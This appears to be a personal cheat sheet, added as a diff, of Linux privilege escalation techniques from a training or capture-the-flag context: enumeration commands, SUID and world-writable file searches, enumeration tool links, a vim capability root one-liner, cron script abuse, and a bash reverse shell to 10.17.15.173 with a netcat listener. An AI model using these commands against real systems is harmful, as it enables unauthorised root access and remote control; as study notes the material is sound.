@@ -1,0 +1,143 @@
+##----- Linux PrivEsc Comm -------##
+
+   1. hostname
+   2. uname -a
+   3. /proc/version
+   4. /etc/passwd
+   5. ps
+ 5.1. ps aux
+   6. env
+   7. sudo -l
+   8. history
+   9. netstat a
+   10. find 
+   
+   Find files:--->
+
+    find . -name flag1.txt:       find the file named “flag1.txt” in the current directory
+    find /home -name flag1.txt:   find the file names “flag1.txt” in the /home directory
+    find / -type d -name config:  find the directory named config under “/”
+    find / -type f -perm 0777:    find files with the 777 permissions (files readable, writable, and executable by all users)
+    find / -perm a=x:             find executable files
+    find /home -user frank:       find all files for user “frank” under “/home”
+    find / -mtime 10:             find files that were modified in the last 10 days
+    find / -atime 10:             find files that were accessed in the last 10 day
+    find / -cmin -60:             find files changed within the last hour (60 minutes)
+    find / -amin -60:             find files accesses within the last hour (60 minutes)
+    find / -size 50M:             find files with a 50 MB size.
+    
+    
+  Folders and files that can be written to or executed from:--->
+
+    find / -writable -type d 2>/dev/null :     Find world-writeable folders
+    find / -perm -222 -type d 2>/dev/null:     Find world-writeable folders
+    find / -perm -o w -type d 2>/dev/null:     Find world-writeable folders  
+    
+    find / -perm -o x -type d 2>/dev/null :    Find world-executable folders
+    
+    
+    
+   Find specific file permissions (SUID Bit):---->  
+    
+    find / -perm -u=s -type f 2>/dev/null
+    
+    find / -type f -perm -04000 -ls 2>/dev/null
+    
+    
+    
+    Find development tools and supported languages:---->
+
+    find / -name perl*
+    find / -name python*
+    find / -name gcc*
+    
+    
+==================================================    
+    
+  #------ Automated Enumeration Tools ------#
+  
+    LinPeas:---     https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS
+    LinEnum:---     https://github.com/rebootuser/LinEnum
+    LES (Linux Exploit Suggester):--- https://github.com/mzet-/linux-exploit-suggester
+    Linux Smart Enumeration:---   https://github.com/diego-treitos/linux-smart-enumeration
+    Linux Priv Checker:---   https://github.com/linted/linuxprivchecker   
+    
+    
+=================
+
+Privilege Escalation: Capabilities:--->
+
+
+Another method system administrators can use to increase the privilege level of a process or binary is “Capabilities”. Capabilities help manage privileges at a more granular level. For example, if the SOC analyst needs to use a tool that needs to initiate socket connections, a regular user would not be able to do that. If the system administrator does not want to give this user higher privileges, they can change the capabilities of the binary. As a result, the binary would get through its task without needing a higher privilege user.
+The capabilities man page provides detailed information on its usage and options.
+
+We can use the getcap tool to list enabled capabilities.
+    
+ $ getcap -r / 2>/dev/null
+ 
+ 
+ ./vim -c ':python3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'   
+    
+    
+=====================
+
+Privilege Escalation: Cron Jobs
+
+Cron jobs are used to run scripts or binaries at specific times. By default, they run with the privilege of their owners and not the current user. While properly configured cron jobs are not inherently vulnerable, they can provide a privilege escalation vector under some conditions.
+The idea is quite simple; if there is a scheduled task that runs with root privileges and we can change the script that will be run, then our script will run with root privileges.
+
+$ cat backup.sh
+
+edit backup.sh :
+
+add: --->
+#!/bin/bash
+chmod u+s /bin/bash #u+s is used give SUID permission
+
+after edit give permission
+$ chmod 777 backup.sh
+$ /bin/bash -p
+
+boom... you become ROOT...
+
+OR
+
+#!/bin/bash
+bash -i >& /dev/tcp/10.17.15.173/8089 0>&1
+
+after edit. start netcat listner...
+
+$ nc -nvlp 8089
+when it execute you got root shell...
+
+======================
+
+Privilege Escalation: PATH
+
+If a folder for which your user has write permission is located in the path, you could potentially hijack an application to run a script. PATH in Linux is an environmental variable that tells the operating system where to search for executables. For any command that is not built into the shell or that is not defined with an absolute path, Linux will start searching in folders defined under PATH. (PATH is the environmental variable we're talking about here, path is the location of a file).
+
+$ echo $PATH
+
+
+=====================
+
+Privilege Escalation: NFS
+
+NFS (Network File Sharing) configuration is kept in the /etc/exports file. This file is created during the NFS server installation and can usually be read by users.
+
+$ cat /etc/exports
+
+The critical element for this privilege escalation vector is the “no_root_squash” option you can see above. By default, NFS will change the root user to nfsnobody and strip any file from operating with root privileges. If the “no_root_squash” option is present on a writable share, we can create an executable with SUID bit set and run it on the target system.
+
+
+
+
+
+
+
+    
+    
+    
+    
+    
+   
